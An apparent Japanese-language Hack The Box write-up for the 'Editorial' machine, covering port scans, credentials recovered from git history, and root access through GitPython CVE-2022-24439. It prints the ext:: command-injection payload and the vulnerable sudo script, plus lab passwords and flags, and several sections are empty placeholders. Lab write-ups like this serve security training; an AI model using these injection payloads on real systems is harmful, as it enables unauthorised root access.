

![HTB Banner](https://github.com/hackthebox/writeup-templates/blob/master/machine/assets/images/banner.png?raw=true)


- URL : 
- #easy #medium #hard #insane
- OS : #Linux #Windows
- Machine Author(s): 
- Hack Date: 2025-01-29,23:23


# Enumeration
使用ツールのオプションが定型化してきてきたのでこの[スクリプト](https://github.com/crum7/HTBScript/blob/main/Enumeration.sh)を使用している
どのポートが空いている?
22番のsshと80番のhttp
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-title: Editorial Tiempo Arriba
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

whatwebはこんな感じ
nginx/1.18.0を使ってるらしい
```bash
[*] whatweb http://Editorial.htb
http://Editorial.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.188.37], Title[Editorial Tiempo Arriba], X-UA-Compatible[IE=edge], nginx[1.18.0]

```

これは、fileアップロードして、リバースシェルとかできるのかな
![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/Editional/images/Pasted%20image%2020250129234628.png)


なんか検索欄とかにsqlインジェクション送ると、cssが崩れるから、burpsuiteで、細かく見る
と思ったら、他の単語入れた時もおんなじ挙動するからただのcssの遅れで、sqlインジェクションしたからとかは関係なさそう

```bash
Output File: /home/snowyowl644/HTBScript/reports/http_Editorial.htb/_25-01-29_08-37-44.txt

Target: http://Editorial.htb/

[08:37:44] Starting: 
[08:37:47] 200 -    3KB - /about
[08:38:10] 200 -    7KB - /upload

```

ffufとかでも特に何も見つからない
dirsearchでも
- /about
- /upload
しかないし、特に何も見つからない。

なので、ファイルアップロードしてリバースシェルができるかを検証してみる。
```bash

```

なんか、ファイルをプレビューする機能がある。
pingでは、こんな感じで花の写真が出てくる。
![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/Editional/images/Pasted%20image%2020250130000830.png)
```bash

```

なんか気まぐれで、このバージョンnginxにの刺さるというpocを実行した。
CVE-2021-23017
https://github.com/M507/CVE-2021-23017-PoC
```bash
└──╼ [★]$ sudo python poc.py --target 10.129.188.37 --dns_server 10.129.188.37 [*] Sending poisoned ARP packets [*] Listening WARNING: Incompatible L3 types detected using <class 'scapy.layers.l2.ARP'> instead of <class 'scapy.layers.inet6.IPv46'> ! WARNING: Incompatible L3 types detected using <class 'scapy.layers.l2.ARP'> instead of <class 'scapy.layers.inet6.IPv46'> ! WARNING: more Incompatible L3 types detected using <class 'scapy.layers.l2.ARP'> instead of <class 'scapy.layers.inet6.IPv46'> ! WARNING: Incompatible L3 types detected using <class 'scapy.layers.l2.ARP'> instead of <class 'scapy.layers.inet6.IPv46'> ! WARNING: Incompatible L3 types detected using <class 'scapy.layers.l2.ARP'> instead of <class 'scapy.layers.inet6.IPv46'> !
```
- **`Scapy` という Python のパケット操作ライブラリ** で何かの警告が出ている
- **ARP (L2: レイヤー2) と IPv6 (L3: レイヤー3) の不整合** がある
- おそらく、スクリプトが IPv4 向けなのに **IPv6 環境で動作しようとしてエラー** になっている
とのことで、うまく動かなかった。


- **Tactics**:
    - #Tactic_情報収集
    - #Tactic_探索
- **Techniques**:
    - #T1016_システムネットワーク構成の探索
    - #T1046_ネットワークサービススキャン
    - #T1057_プロセス探索`
    - #T1018_リモートシステム探索`
    - その他のDiscovery関連技術...




# Foothold
SSRFの脆弱性を利用する
![](https://i.imgur.com/jyQXbCc.png)

![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/Editional/images/Pasted%20image%2020250129234628.png)
```bash

```

```bash

```

```bash

```

```bash

```

```bash

```


- **Tactics**:
    - #Tactic_初期アクセス
    - #Tactic_Escution_実行
- **Techniques**:
    - #T1190_公開アプリケーションのエクスプロイト
    - #T1059_コマンドとスクリプトインタープリタ
    - #T1078_有効なアカウント
    - その他のInitial Access/Execution関連技術...




# Lateral Movement
.gitがあるから、remote-urlがあったら、GitHackが使えないかなって思ったんだけど、remoteが設定されてないっぽい。
```bash
dev@editorial:~/apps/.git/logs$ cat ../config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
	email = dev-carlos.valderrama@tiempoarriba.htb
	name = dev-carlos.valderrama

```

なんかgitのlogを漁っていたら、今のアカウントである、devアカウントにダウングレードしたというログを見つけた。
git showで変更部分を見てみると、Prodアカウントを見つけた。
`Username: prod\nPassword: 080217_Producti0n_2023!@`

```bash
dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------

```




# Privilege Escalation

毎回お馴染みのsudo -lで、prodがスーパーユーザーとして実行できるコマンドやファイルを一覧で表示する
```bash
prod@editorial:/home/dev/apps$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *

```

`/opt/internal_apps/clone_changes/clone_prod_change.py`の中身を見る
`from git import Repo`の一文がある。
この一文は、Git リポジトリと対話するための GitPythonというライブラリを使用していることを示している。
バージョンを調べると、3.1.29であることがわかる。
```bash
rod@editorial:/home/dev/apps$ python3 -m  pip show GitPython 
Name: GitPython
Version: 3.1.29
Summary: GitPython is a python library used to interact with Git repositories
Home-page: https://github.com/gitpython-developers/GitPython
Author: Sebastian Thiel, Michael Trier
Author-email: byronimo@gmail.com, mtrier@gmail.com
License: BSD
Location: /usr/local/lib/python3.10/dist-packages
Requires: gitdb
Required-by: 

```

GitPtython 3.1.29の脆弱性を調べると、CVE-2022-24439が見つかった。
https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
この脆弱性は、ユーザー入力の検証が不適切であるために、悪意のあるリモート URL を `clone` コマンドに挿入できる 
この脆弱性が悪用可能なのは、ライブラリが外部の `git` コマンドを呼び出す際に、入力引数を十分にサニタイズしていない ためです。  
ただし、この問題は `ext` トランスポートプロトコルが有効になっている場合にのみ発生します。
PoCを試す。

1. **`Repo.init('', bare=True)`**
    
    - 空の Git リポジトリを作成します。
    - `bare=True` にすると、作業ディレクトリを持たないリポジトリ（通常の Git リポジトリとは異なり、`working tree` がない）になります。
2. **`clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])`**
    
    - `clone_from` は、通常はリモートリポジトリ（例: `https://github.com/user/repo.git`）をクローンするための関数。
    - しかし、`ext::` プロトコルを使用すると、Git の `shell` 経由で任意のコマンドを実行できる。
    - `sh -c touch% /tmp/pwned` は、`touch /tmp/pwned` を実行し、`/tmp/` に `pwned` という空のファイルを作成する。
3. **`multi_options=["-c protocol.ext.allow=always"]`**
    
    - 通常、Git は `ext::` プロトコルの使用を制限しているため、明示的に `-c protocol.ext.allow=always` を指定して有効化している。

```bash
from git import Repo

# Git の bare リポジトリを作成
r = Repo.init('', bare=True)

# 悪意のあるリモートリポジトリをクローン
r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])

```


そういえば、PoCを試そうとおもたんだけど、今回は、sudoで実行できるファイルの書き込み権限がないので、このファイルに合わせた形で引数を作ってsudoで実行する必要がある。
- 所有者（User, u） → `rwx`
    - 読み取り（r）
    - 書き込み（w）
    - 実行（x）
    - つまり、何でもできる（フルアクセス）
- グループ（Group, g） → `r-x`
    - 読み取り（r）
    - 実行（x）
    - 書き込み（w）がない → 編集できないが、実行はできる
- その他のユーザー（Other, o）→ `---`
    - アクセス権なし → 他のユーザーは何もできない
    - 
```bash
prod@editorial:/home/dev/apps$ ls -l /opt/internal_apps/clone_changes/clone_prod_change.py
-rwxr-x--- 1 root prod 256 Jun  4  2024 /opt/internal_apps/clone_changes/clone_prod_change.py
```

`/opt/internal_apps/clone_changes/clone_prod_change.py`の中身
 
 
 `ext::` プロトコルの脆弱性による RCE(CVE-2022-24439)
- `clone_from()` で `multi_options=["-c protocol.ext.allow=always"]` を指定しているため、`ext::` プロトコルが有効 になっている
- これにより、以下のようにして リモートコード実行（RCE）が可能：
    `python3 clone_prod_change.py 'ext::sh -c "touch /tmp/hacked"'`
    - これを実行すると、システム上に `/tmp/hacked` というファイルが作成される（攻撃成功）
    - 本来クローンすべき URL の代わりに、シェルコマンドを実行させることができる
```bash
#!/usr/bin/python3

import os
import sys
from git import Repo

# 作業ディレクトリを変更
os.chdir('/opt/internal_apps/clone_changes')

# コマンドライン引数からクローンするURLを取得
url_to_clone = sys.argv[1]

# 空の Git リポジトリを作成
r = Repo.init('', bare=True)

# 指定された URL から Git リポジトリをクローン
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])

```



- **Tactics**:
    - #Tactic_特権昇格
- **Techniques**:
    - #T1068_特権昇格のためのエクスプロイト
    - #T1055_プロセス注入
    - #T1053_スケジュールされたタスク/ジョブ
    - その他のPrivilege Escalation関連技術...




## Notes

- **Tactics**:
    - #Tactic_永続化
    - #Tactic_防御回避
- **Techniques**:
    - #T1098_アカウント操作
    - #T1553_信頼制御の転覆
    - #T1070_ホスト上の痕跡削除
    - その他のPersistence/Defense Evasion関連技術...

<このWriteupで特に重要な点や学んだことを追加で記載するセクション>

## Flags

- **User**: 447bc0b6c29da990713dcf30830d527d
- **Root**: 5c317564d1f152923387587544a28d46

### ポイント
